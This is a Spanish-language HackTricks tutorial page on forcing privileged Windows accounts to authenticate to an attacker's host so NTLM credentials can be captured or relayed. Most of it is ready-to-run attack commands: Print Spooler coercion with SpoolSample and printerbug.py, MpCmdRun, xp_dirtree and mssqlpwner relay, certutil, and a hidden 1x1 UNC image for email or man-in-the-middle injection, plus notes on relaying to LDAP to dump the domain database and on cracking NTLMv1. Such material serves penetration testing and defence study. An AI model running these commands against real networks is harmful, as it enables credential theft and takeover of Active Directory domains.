# Forzar la Autenticación Privilegiada NTLM

{% hint style="success" %}
Aprende y practica Hacking en AWS:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Revisa los [**planes de suscripción**](https://github.com/sponsors/carlospolop)!
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Comparte trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos de github.

</details>
{% endhint %}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) es una **colección** de **disparadores de autenticación remota** codificados en C# utilizando el compilador MIDL para evitar dependencias de terceros.

## Abuso del Servicio de Spooler

Si el _**Servicio de Spooler de Impresión**_ está **habilitado**, puedes usar algunas credenciales de AD ya conocidas para **solicitar** al servidor de impresión del Controlador de Dominio una **actualización** sobre nuevos trabajos de impresión y simplemente indicarle que **envíe la notificación a algún sistema**.\
Ten en cuenta que cuando la impresora envía la notificación a sistemas arbitrarios, necesita **autenticarse contra** ese **sistema**. Por lo tanto, un atacante puede hacer que el _**Servicio de Spooler de Impresión**_ se autentique contra un sistema arbitrario, y el servicio **usará la cuenta de computadora** en esta autenticación.

### Encontrar Servidores Windows en el dominio

Usando PowerShell, obtén una lista de máquinas Windows. Los servidores suelen ser prioridad, así que enfoquémonos allí:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### Encontrar servicios de Spooler escuchando

Usando un @mysmartlogin (Vincent Le Toux) ligeramente modificado [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket), verifica si el servicio de Spooler está escuchando:
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
También puedes usar rpcdump.py en Linux y buscar el protocolo MS-RPRN.
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
### Pida al servicio que se autentique contra un host arbitrario

Puede compilar[ **SpoolSample desde aquí**](https://github.com/NotMedic/NetNTLMtoSilverTicket)**.**
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
o usa [**dementor.py de 3xocyte**](https://github.com/NotMedic/NetNTLMtoSilverTicket) o [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) si estás en Linux
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
### Combinando con Delegación No Restringida

Si un atacante ya ha comprometido una computadora con [Delegación No Restringida](unconstrained-delegation.md), el atacante podría **hacer que la impresora se autentique contra esta computadora**. Debido a la delegación no restringida, el **TGT** de la **cuenta de computadora de la impresora** será **guardado en** la **memoria** de la computadora con delegación no restringida. Como el atacante ya ha comprometido este host, podrá **recuperar este ticket** y abusar de él ([Pass the Ticket](pass-the-ticket.md)).

## Autenticación Forzada RCP

{% embed url="https://github.com/p0dalirius/Coercer" %}

## PrivExchange

El ataque `PrivExchange` es el resultado de un defecto encontrado en la **función `PushSubscription` del Exchange Server**. Esta función permite que el servidor de Exchange sea forzado por cualquier usuario de dominio con un buzón para autenticarse en cualquier host proporcionado por el cliente a través de HTTP.

Por defecto, el **servicio de Exchange se ejecuta como SYSTEM** y se le otorgan privilegios excesivos (específicamente, tiene **privilegios WriteDacl en el dominio antes de la Actualización Acumulativa de 2019**). Este defecto puede ser explotado para habilitar el **reenvío de información a LDAP y posteriormente extraer la base de datos NTDS del dominio**. En casos donde el reenvío a LDAP no es posible, este defecto aún puede ser utilizado para reenviar y autenticar a otros hosts dentro del dominio. La explotación exitosa de este ataque otorga acceso inmediato al Administrador de Dominio con cualquier cuenta de usuario de dominio autenticada.

## Dentro de Windows

Si ya estás dentro de la máquina Windows, puedes forzar a Windows a conectarse a un servidor utilizando cuentas privilegiadas con:

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```
O utiliza esta otra técnica: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

Es posible utilizar certutil.exe lolbin (binario firmado por Microsoft) para forzar la autenticación NTLM:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTML injection

### Via email

Si conoces la **dirección de correo electrónico** del usuario que inicia sesión en una máquina que deseas comprometer, podrías simplemente enviarle un **correo electrónico con una imagen de 1x1** como
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
y cuando lo abra, intentará autenticarse.

### MitM

Si puedes realizar un ataque MitM a una computadora e inyectar HTML en una página que él visualizará, podrías intentar inyectar una imagen como la siguiente en la página:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## Cracking NTLMv1

Si puedes capturar [los desafíos de NTLMv1, lee aquí cómo crackearlos](../ntlm/#ntlmv1-attack).\
&#xNAN;_&#x52;ecuerda que para crackear NTLMv1 necesitas establecer el desafío de Responder en "1122334455667788"_

{% hint style="success" %}
Aprende y practica Hacking en AWS:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Revisa los [**planes de suscripción**](https://github.com/sponsors/carlospolop)!
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Comparte trucos de hacking enviando PRs a los** [**repositorios de HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
